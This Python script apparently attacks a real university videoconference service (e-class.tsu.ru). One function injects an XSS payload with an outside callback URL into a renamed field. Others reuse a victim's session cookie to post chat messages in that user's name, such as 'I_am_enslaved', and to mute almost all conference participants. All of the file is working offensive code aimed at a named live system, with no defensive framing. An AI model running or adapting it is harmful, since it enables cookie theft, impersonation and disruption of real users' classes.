import requests
from config import get_xss, TARGET_URL, get_headers, get_base_headers
from helper import load_json_postData


def rename(CALLBACK_URL):
    postData = load_json_postData()
    postData[11] = get_xss(CALLBACK_URL)
    postData = "|".join(postData)
    # print(postData)
    headers = get_base_headers()
    urls = requests.post(url=TARGET_URL, data=postData, headers=headers)
    # print(urls.content)


def message():
    headers = get_base_headers()
    postData = "7|0|8|https://e-class.tsu.ru/videoconference/|C17DA4923F3BB99EE03E46E05FE3AE93|com.mind.videoconference.rpc.api.ChatService|sendChatMessage|java.lang.String/2004016611|com.mind.videoconference.dto.id.ConferenceSessionParticipantId/1079013347|test1111|LI_BEGIN::action=WEB_USER_CHAT_MESSAGE;ConferenceSessionParticipantId=;message=test::LI_END|1|2|3|4|3|5|6|5|7|0|8|"
    urls = requests.post(
        url="https://e-class.tsu.ru/videoconference/service/chat",
        data=postData,
        headers=headers,
    )
    # print(urls.content)


def message_test_message(cookie):
    headers = get_headers(cookie)
    postData = "7|0|4|https://e-class.tsu.ru/videoconference/|396AA239B4CD4368870E53E2588A2DA5|com.mind.videoconference.rpc.api.MediaControllerService|muteAlmostAll|1|2|3|4|0|"
    # print(headers)
    urls = requests.post(
        url="https://e-class.tsu.ru/videoconference/service/media",
        data=postData,
        headers=headers,
    )
    return urls.content


def message_with_cookie(cookie):
    headers = get_headers(cookie)
    postData = f"7|0|8|https://e-class.tsu.ru/videoconference/|C17DA4923F3BB99EE03E46E05FE3AE93|com.mind.videoconference.rpc.api.ChatService|sendChatMessage|java.lang.String/2004016611|com.mind.videoconference.dto.id.ConferenceSessionParticipantId/1079013347|I_am_enslaved|LI_BEGIN::action=WEB_USER_CHAT_MESSAGE;ConferenceSessionParticipantId=;message=I_am_enslaved::LI_END|1|2|3|4|3|5|6|5|7|0|8|"
    urls = requests.post(
        url="https://e-class.tsu.ru/videoconference/service/chat",
        data=postData,
        headers=headers,
    )
    # print(urls.content)
    return urls.content


if __name__ == "__main__":
    pass
